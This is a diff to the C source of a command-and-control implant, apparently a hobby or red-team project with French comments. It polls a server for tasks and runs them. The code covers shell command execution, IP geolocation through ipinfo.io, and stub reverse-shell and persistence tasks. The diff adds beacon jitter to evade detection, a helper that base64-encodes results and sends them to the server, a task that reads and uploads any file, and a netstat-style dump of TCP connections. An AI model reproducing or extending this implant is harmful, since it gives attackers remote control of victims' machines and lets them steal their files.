@@ -7,6 +7,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <curl/curl.h>
+#include <errno.h>
 #include "base64.h"
 
 #define SERVER_IP "127.0.0.1"
@@ -14,10 +15,13 @@
 #define BUFFER_SIZE 4096
 
 char uid[64];
-double sleep_time = 5;
+double base_sleep_time = 5;
+double sleep_time = 5; // jitter applied
 double jitter = 0.0;
 
-// Nouvelle fonction pour créer une connexion socket au serveur
+// function prototypes
+void send_result(const char *id_task, const char *result_data, int is_error);
+
 int connect_to_server() {
     int sockfd;
     struct sockaddr_in servaddr;
@@ -130,25 +134,8 @@ void task_execve(char *command_str, char *argument_str, const char *id_task) {
     }
     pclose(fp);
     
-    // Send the result back to the server
     if (strlen(result_buffer) > 0) {
-        // encoding and sending the result
-        char *encoded_result = encode(result_buffer);
-        char cmd[BUFFER_SIZE];
-        char response[1024] = {0};
-        
-        // Format de commande : "RESULT,uid,id_task,encoded_result"
-        snprintf(cmd, sizeof(cmd), "RESULT,%s,%s,%s\n", uid, id_task, encoded_result);
-        printf("Sending result: %s\n", cmd);
-        
-        // Envoi via socket
-        if (send_command_and_get_response(cmd, response, sizeof(response)) < 0) {
-            fprintf(stderr, "Erreur lors de l'envoi du résultat\n");
-        } else {
-            printf("Server response: %s\n", response);
-        }
-        
-        free(encoded_result);
+        send_result(id_task, result_buffer, 0);
     } else {
         printf("No command output to send\n");
     }
@@ -163,7 +150,8 @@ void task_sleep(char *sleep_time_str, char *jitter_str) {
     if (sleep_time_str != NULL) {
         char *decoded_sleep = decode(sleep_time_str);
         if (decoded_sleep != NULL) {
-            sleep_time = atof(decoded_sleep);
+            base_sleep_time = atof(decoded_sleep);
+            sleep_time = base_sleep_time;
             printf("New sleep time: %.2f seconds\n", sleep_time);
             free(decoded_sleep);
         }
@@ -177,19 +165,20 @@ void task_sleep(char *sleep_time_str, char *jitter_str) {
             free(decoded_jitter);
         }
     }
-    
-    return;
 }
 
 void calculate_random_sleep_time() {
-    double time_1 = sleep_time - (jitter/100.0 * sleep_time);
-    double time_2 = sleep_time + (jitter/100.0 * sleep_time);
+    double time_1 = base_sleep_time - (jitter/100.0 * base_sleep_time);
+    double time_2 = base_sleep_time + (jitter/100.0 * base_sleep_time);
     
     // seeding random number generator
     srand(time(NULL));
     
     double random_factor = (double)rand() / RAND_MAX;
     sleep_time = time_1 + random_factor * (time_2 - time_1);
+    
+    printf("Applied jitter: base=%.2fs, jitter=%.2f%%, sleep=%.2fs\n", 
+           base_sleep_time, jitter, sleep_time);
 }
 
 // Fonction de callback pour libcurl
@@ -203,52 +192,30 @@ void task_locate(const char *id_task) {
     
     char result_buffer[4096] = {0};
     
-    // Initialisation de curl
+    // initialize curl
     CURL *curl = curl_easy_init();
     if (!curl) {
         fprintf(stderr, "Erreur d'initialisation de curl\n");
+        send_result(id_task, "Error initializing curl", 1);
         return;
     }
     
-    // Configuration de la requête
     curl_easy_setopt(curl, CURLOPT_URL, "https://ipinfo.io");
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, result_buffer);
     
-    // Exécution de la requête
+    // exec
     CURLcode res = curl_easy_perform(curl);
     
-    // Nettoyage
     curl_easy_cleanup(curl);
     
     if (res != CURLE_OK) {
         fprintf(stderr, "Erreur curl: %s\n", curl_easy_strerror(res));
+        send_result(id_task, curl_easy_strerror(res), 1);
         return;
     }
     
-    // Encodage et envoi du résultat
-    char *encoded_result = encode(result_buffer);
-    if (encoded_result == NULL) {
-        printf("Error encoding to base64\n");
-        return;
-    }
-    
-    // Format de la commande : "RESULT,uid,id_task,encoded_result"
-    char cmd[BUFFER_SIZE];
-    char response[1024] = {0};
-    
-    snprintf(cmd, sizeof(cmd), "RESULT,%s,%s,%s\n", uid, id_task, encoded_result);
-    printf("Command to send: %s\n", cmd);
-    
-    // Envoi via socket
-    if (send_command_and_get_response(cmd, response, sizeof(response)) < 0) {
-        fprintf(stderr, "Erreur lors de l'envoi du résultat de localisation\n");
-    } else {
-        printf("Server response: %s\n", response);
-    }
-    
-    // Libération de la mémoire
-    free(encoded_result);
+    send_result(id_task, result_buffer, 0);
 }
 
 void task_revshell() {
@@ -266,9 +233,47 @@ void task_persist() {
     return;
 }
 
-void task_cat() {
+// general function to send results
+void send_result(const char *id_task, const char *result_data, int is_error) {
+    char *encoded_result = encode(result_data);
+    
+    char cmd[BUFFER_SIZE];
+    char response[1024] = {0};
+    
+    snprintf(cmd, sizeof(cmd), "RESULT,%s,%s,%s\n", uid, id_task, encoded_result);
+    printf("Sending %s data\n", is_error ? "error" : "result");
+    
+    if (send_command_and_get_response(cmd, response, sizeof(response)) < 0) {
+        fprintf(stderr, "Error sending result\n");
+    } else {
+        printf("Server response: %s\n", response);
+    }
+    
+    free(encoded_result);
+}
+
+void task_cat(char *file_path_str, const char *id_task) {
     printf("Executing task cat\n");
-    return;
+    
+    // decoding file path
+    char *file_path = decode(file_path_str);
+    if (!file_path) {
+        send_result(id_task, "Error decoding file path", 1);
+        return;
+    }
+    
+    printf("Reading file: %s\n", file_path);
+    
+    // open and read file
+    FILE *file = fopen(file_path, "r");
+    char content[BUFFER_SIZE] = {0};
+    fread(content, 1, BUFFER_SIZE-1, file);
+    fclose(file);
+    
+    // sending the result
+    send_result(id_task, content, 0);
+    
+    free(file_path);
 }
 
 void task_mv() {
@@ -286,19 +291,38 @@ void task_ps() {
     return;
 }
 
-void task_netstat() {
+void task_netstat(const char *id_task) {
     printf("Executing task netstat\n");
-    return;
+    
+    char result_buffer[BUFFER_SIZE] = {0};
+    
+    // reading TCP connections from /proc/net/tcp
+    FILE *tcp_file = fopen("/proc/net/tcp", "r");
+    //proc/net/udp
+
+    strcat(result_buffer, "TCP IPv4 Connections:\n");
+    char line[1024];
+    if (fgets(line, sizeof(line), tcp_file) != NULL) {
+        strcat(result_buffer, line); 
+    }
+    
+    // read the rest of the lines
+    while (fgets(line, sizeof(line), tcp_file) != NULL) {
+        strncat(result_buffer, line, sizeof(result_buffer) - strlen(result_buffer) - 1);
+    }
+    fclose(tcp_file);
+    
+    send_result(id_task, result_buffer, 0);
 }
 
 void check_commands() {
     char cmd[128];
     char result[1024] = {0};
     
-    // Format de la commande : "FETCH,uid"
+    // command format : "FETCH,uid"
     snprintf(cmd, sizeof(cmd), "FETCH,%s\n", uid);
     
-    // Envoi via socket
+    // sending with socket
     if (send_command_and_get_response(cmd, result, sizeof(result)) < 0) {
         fprintf(stderr, "Erreur lors de la récupération des commandes\n");
         return;
@@ -306,7 +330,7 @@ void check_commands() {
     
     printf("Server response: %s\n", result);
     
-    // Check if the server returns an error
+    // checking if server returns an error
     if (strncmp(result, "ERROR", 5) == 0) {
         printf("Error received from the server: %s\n", result);
         return;
@@ -319,7 +343,7 @@ void check_commands() {
         char *id_task = strtok(NULL, ",");
         if (strcmp(type, "EXECVE") == 0) {
             char *command = strtok(NULL, ",");
-            char *argument = strtok(NULL, ",");  // Get the argument as well
+            char *argument = strtok(NULL, ",");
             task_execve(command, argument, id_task);
         } else if (strcmp(type, "SLEEP") == 0) {
             char *sleep_time = strtok(NULL, ",");
@@ -334,7 +358,8 @@ void check_commands() {
         } else if (strcmp(type, "PERSIST") == 0) {
             task_persist();
         } else if (strcmp(type, "CAT") == 0) {
-            task_cat();
+            char *file_path = strtok(NULL, ",");
+            task_cat(file_path, id_task);
         } else if (strcmp(type, "MV") == 0) {
             task_mv();
         } else if (strcmp(type, "RM") == 0) {
@@ -342,7 +367,7 @@ void check_commands() {
         } else if (strcmp(type, "PS") == 0) {
             task_ps();
         } else if (strcmp(type, "NETSTAT") == 0) {
-            task_netstat();
+            task_netstat(id_task);
         } else {
             printf("Unknown or unsupported type: %s\n", type);
         }
@@ -352,10 +377,8 @@ void check_commands() {
 }
 
 int main() {
-    // Initialize the decoding table
     build_decoding_table();
     
-    // Initialize curl at program start
     curl_global_init(CURL_GLOBAL_DEFAULT);
     
     // step 1 : get uid
@@ -373,10 +396,8 @@ int main() {
         sleep(sleep_time);
     }
     
-    // Clean up curl resources
-    curl_global_cleanup();
-    
     // cleaning
+    curl_global_cleanup();
     base64_cleanup();
     return 0;
 }
